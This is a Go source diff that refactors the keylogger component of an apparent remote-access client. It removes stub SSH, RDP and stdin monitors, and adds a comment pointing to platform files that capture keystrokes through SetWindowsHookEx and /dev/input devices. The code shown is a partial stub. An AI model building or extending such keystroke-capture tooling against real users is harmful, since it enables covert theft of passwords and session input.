@@ -1,11 +1,9 @@
 package client
 
 import (
-	"bufio"
 	"fmt"
 	"log"
 	"os"
-	"runtime"
 	"sync"
 	"time"
 
@@ -60,14 +58,14 @@ func (kl *Keylogger) Start(payload *common.KeyloggerPayload) error {
 		go kl.monitorSSH()
 	case "rdp":
 		go kl.monitorRDP()
-	case "monitor":
+	case "monitor", "general", "":
 		go kl.monitorGeneral()
 	default:
 		kl.running = false
 		if kl.logFile != nil {
 			kl.logFile.Close()
 		}
-		return fmt.Errorf("unknown target: %s", kl.target)
+		return fmt.Errorf("unknown target: %s (use 'ssh', 'rdp', or 'monitor')", kl.target)
 	}
 
 	log.Printf("Keylogger started for target: %s", kl.target)
@@ -135,115 +133,12 @@ func (kl *Keylogger) logKeys(keys string) {
 	}
 }
 
-// monitorSSH monitors SSH sessions
-func (kl *Keylogger) monitorSSH() {
-	// Note: This is a simplified implementation
-	// In production, you would need to hook into SSH session logs or use ptrace
-
-	log.Printf("SSH monitoring started (basic implementation)")
-
-	// Monitor SSH-related log files on Linux
-	if runtime.GOOS == "linux" {
-		kl.monitorLogFile("/var/log/auth.log")
-	} else {
-		log.Printf("SSH monitoring not fully implemented for %s", runtime.GOOS)
-	}
-}
-
-// monitorRDP monitors RDP sessions
-func (kl *Keylogger) monitorRDP() {
-	// Note: This is a simplified implementation
-	// On Windows, you would monitor RDP session events
-
-	log.Printf("RDP monitoring started (basic implementation)")
-
-	if runtime.GOOS == "windows" {
-		// Monitor Windows Event Logs for RDP events
-		// This would require Windows-specific APIs
-		log.Printf("RDP monitoring requires Windows Event Log APIs")
-	} else {
-		log.Printf("RDP monitoring only available on Windows")
-	}
-}
-
-// monitorGeneral provides general keyboard monitoring
-func (kl *Keylogger) monitorGeneral() {
-	// Note: This is a simplified implementation
-	// Real keyboard monitoring requires low-level hooks:
-	// - Windows: SetWindowsHookEx
-	// - Linux: /dev/input/eventX or X11 hooks
-	// - macOS: CGEventTap
-
-	log.Printf("General monitoring started (basic implementation)")
-	log.Printf("WARNING: Full keyboard monitoring requires platform-specific low-level APIs")
-
-	// Placeholder: Monitor stdin for demonstration
-	// In production, use platform-specific keyboard hooks
-	kl.monitorStdin()
-}
-
-// monitorStdin monitors standard input (for demonstration)
-func (kl *Keylogger) monitorStdin() {
-	scanner := bufio.NewScanner(os.Stdin)
-
-	for {
-		select {
-		case <-kl.stopChan:
-			return
-		default:
-			if scanner.Scan() {
-				text := scanner.Text()
-				if text != "" {
-					kl.logKeys(text)
-				}
-			}
-		}
-	}
-}
-
-// monitorLogFile monitors a log file for changes
-func (kl *Keylogger) monitorLogFile(filename string) {
-	file, err := os.Open(filename)
-	if err != nil {
-		log.Printf("Failed to open log file %s: %v", filename, err)
-		return
-	}
-	defer file.Close()
-
-	// Seek to end of file
-	file.Seek(0, os.SEEK_END)
-
-	scanner := bufio.NewScanner(file)
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-kl.stopChan:
-			return
-		case <-ticker.C:
-			for scanner.Scan() {
-				line := scanner.Text()
-				if line != "" {
-					kl.logKeys(line)
-				}
-			}
-		}
-	}
-}
-
-// Note: For production use, you would implement platform-specific keyboard hooks:
+// Platform-specific functions are implemented in:
+// - keylogger_windows.go: Windows implementation using SetWindowsHookEx
+// - keylogger_linux.go: Linux/Unix implementation using /dev/input/eventX
 //
-// Windows: Use SetWindowsHookEx with WH_KEYBOARD_LL
-// import "golang.org/x/sys/windows"
-//
-// Linux: Monitor /dev/input/eventX or use X11 hooks
-// import "github.com/MarinX/keylogger"
-//
-// macOS: Use CGEventTap
-// import "github.com/MarinX/keylogger"
-//
-// These require CGO and platform-specific build constraints.
-// For a complete implementation, consider using existing libraries like:
-// - github.com/MarinX/keylogger (Linux)
-// - github.com/kindlyfire/go-keylogger (Windows)
+// Each platform implements:
+// - monitorSSH(): Monitor SSH sessions
+// - monitorRDP(): Monitor RDP/remote sessions
+// - monitorGeneral(): General keyboard monitoring
+// - startPlatformMonitor(): Platform-specific initialization
